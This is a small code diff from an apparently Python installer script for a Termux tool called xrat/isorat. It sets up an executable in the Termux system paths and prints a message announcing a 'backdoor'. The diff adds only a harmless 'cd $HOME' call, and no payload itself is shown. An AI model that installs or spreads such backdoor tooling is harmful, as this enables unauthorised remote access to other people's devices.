@@ -18,6 +18,7 @@ os.system('chmod +x xrat')
 os.system('cd isorat && mv xrat /data/data/com.termux/files/usr/bin')
 os.system('mv isorat /data/data/com.termux/files/usr/etc/')
 #os.system('/data/data/com.termux/files/home/isorat')
+os.system('cd $HOME')
 print(f'{W}[{R}✓{W}]{G} start backdoor write {R} xrat')	
 
 
